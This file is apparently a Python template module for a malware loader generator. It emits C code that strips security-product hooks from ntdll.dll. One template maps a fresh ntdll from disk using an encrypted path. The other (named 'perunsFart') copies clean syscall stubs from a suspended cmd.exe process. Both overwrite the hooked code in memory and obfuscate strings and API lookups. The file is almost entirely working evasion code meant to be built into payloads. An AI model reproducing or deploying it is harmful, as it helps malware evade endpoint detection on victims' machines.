from code_templates import headers 
from code_templates import winapi

def freshCopy(ntdllPath, ntdllKey, ntdllDecryptionRoutine, sNtdllPath, sNtdllPath_len, sNtdllKey, sNtdllKey_len):
    requiredHeaders = []
    requiredHeaders.append(headers.SKERNEL32)

    requiredWinApis = []
    requiredWinApis.append(winapi.VIRTUALPROTECT)
    requiredWinApis.append(winapi.CREATEFILEMAPPINGA)
    requiredWinApis.append(winapi.MAPVIEWOFFILE)
    requiredWinApis.append(winapi.UNMAPVIEWOFFILE)
    requiredWinApis.append(winapi.CLOSE_HANDLE)
    requiredWinApis.append(winapi.CREATE_FILE)


    codeBase = """
unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };

static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;
    PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead->e_lfanew);
    int i;
    
    for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + 
            ((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char *) pImgSectionHead->Name, ".text")) {
            VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE,
                &oldprotect);
            if (!oldprotect) {
                return -1;
            }
            memcpy( (LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
                (LPVOID)((DWORD_PTR) pMapping + (DWORD_PTR) pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize);

            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize,
                oldprotect,
                &oldprotect);
            if (!oldprotect) {
                return -1;
            }
            return 0;
        }
    }
    return -1;
}
    """
    
    main = """
    unsigned char {sNtdllPath}[] = {{ {ntdllPath} }};
    unsigned char {sNtdllKey}[] = {{ {ntdllKey} }};

    unsigned int {sNtdllPath_len} = sizeof({sNtdllPath});
    unsigned int sNtdll_len = sizeof(sNtdll);
    unsigned int {sNtdllKey_len} = sizeof({sNtdllKey});
    {ntdllDecryptionRoutine}
    int ret = 0;
    HANDLE hFile;
    HANDLE hFileMapping;
    LPVOID pMapping;

    hFile = CreateFileA_p((LPCSTR) {sNtdllPath}, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if ( hFile == INVALID_HANDLE_VALUE ) {{
            // failed to open ntdll.dll
            return -1;
    }}

    hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (! hFileMapping) {{
            // file mapping failed
            CloseHandle_p(hFile);
            return -1;
    }}    

    pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {{
                    // mapping failed
                    CloseHandle_p(hFileMapping);
                    CloseHandle_p(hFile);
                    return -1;
    }}

    ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pMapping);

    UnmapViewOfFile_p(pMapping);
    CloseHandle_p(hFileMapping);
    CloseHandle_p(hFile);	
    """.format(
        ntdllPath = ntdllPath,
        ntdllKey = ntdllKey,
        ntdllDecryptionRoutine = ntdllDecryptionRoutine, 
        sNtdllPath = sNtdllPath,
        sNtdllPath_len = sNtdllPath_len,
        sNtdllKey = sNtdllKey,
        sNtdllKey_len = sNtdllKey_len
    )

    return requiredHeaders, requiredWinApis, codeBase, main


def perunsFart():
    requiredHeaders = []

    requiredWinApis = []
    requiredWinApis.append(winapi.VIRTUALPROTECT)
    requiredWinApis.append(winapi.CREATE_PROCESS)
    requiredWinApis.append(winapi.VIRTUAL_ALLOC)
    requiredWinApis.append(winapi.READ_PROCESS_MEMORY)
    requiredWinApis.append(winapi.TERMINATE_PROCESS)
    requiredWinApis.append(winapi.VIRTUAL_FREE)

    codeBase = """
unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
int FindFirstSyscall(char * pMem, DWORD size){
    
    // gets the first byte of first syscall
    DWORD i = 0;
    DWORD offset = 0;
    BYTE pattern1[] = "\x0f\x05\xc3";  // syscall ; ret
    BYTE pattern2[] = "\xcc\xcc\xcc";  // int3 * 3
    
    // find first occurance of syscall+ret instructions
    for (i = 0; i < size - 3; i++) {
        if (!memcmp(pMem + i, pattern1, 3)) {
            offset = i;
            break;
        }
    }        
    
    // now find the beginning of the syscall
    for (i = 3; i < 50 ; i++) {
        if (!memcmp(pMem + offset - i, pattern2, 3)) {
            offset = offset - i + 3;
            break;
        }        
    }

    return offset;
}


int FindLastSysCall(char * pMem, DWORD size) {

    // returns the last byte of the last syscall
    DWORD i;
    DWORD offset = 0;
    BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";  // syscall ; ret ; int 2e ; ret ; int3 * 3
    
    // backwards lookup
    for (i = size - 9; i > 0; i--) {
        if (!memcmp(pMem + i, pattern, 9)) {
            offset = i + 6;
            break;
        }
    }        
    
    return offset;
}
        
        
static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) {
/*
    UnhookNtdll() finds fresh "syscall table" of ntdll.dll from suspended process and copies over onto hooked one
*/
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pCache;
    PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pCache + pImgDOSHead->e_lfanew);
    int i;

    unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
    
    VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);
    
    // find .text section
    for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char *)pImgSectionHead->Name, ".text")) {
            // prepare ntdll.dll memory region for write permissions.
            VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                            pImgSectionHead->Misc.VirtualSize,
                            PAGE_EXECUTE_READWRITE,
                            &oldprotect);
            if (!oldprotect) {
                    // RWX failed!
                    return -1;
            }

            // copy clean "syscall table" into ntdll memory
            DWORD SC_start = FindFirstSyscall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
            DWORD SC_end = FindLastSysCall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
            
            if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
                DWORD SC_size = SC_end - SC_start;
                memcpy( (LPVOID)((DWORD_PTR) hNtdll + SC_start),
                        (LPVOID)((DWORD_PTR) pCache + + SC_start),
                        SC_size);
            }

            // restore original protection settings of ntdll
            VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                            pImgSectionHead->Misc.VirtualSize,
                            oldprotect,
                            &oldprotect);
            if (!oldprotect) {
                    // it failed
                    return -1;
            }
            return 0;
        }
    }
    
    // failed? .text not found!
    return -1;
}
    """

    main = """
    int ret = 0;

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    
    BOOL success = CreateProcessA_p(
        NULL, 
        (LPSTR)"cmd.exe", 
        NULL, 
        NULL, 
        FALSE, 
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        //CREATE_NEW_CONSOLE,
        NULL, 
        "C:\\\\Windows\\\\System32\\\\", 
        &si, 
        &pi);

    if (success == FALSE) {
        return 1;
    }	

    // get the size of ntdll module in memory
    char * pNtdllAddr = (char *) GetModuleHandle("ntdll.dll");
    IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pNtdllAddr;
    IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pNtdllAddr + pDosHdr->e_lfanew);
    IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
    
    SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;
    
    // allocate local buffer to hold temporary copy of clean ntdll from remote process
    LPVOID pCache = VirtualAlloc_p(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
    
    
    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory_p(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &bytesRead))
        return 1;
    
    TerminateProcess_p(pi.hProcess, 0);

    // remove hooks
    ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pCache);
    

    // Clean up.
    VirtualFree_p(pCache, 0, MEM_RELEASE);
    """

    return requiredHeaders, requiredWinApis, codeBase, main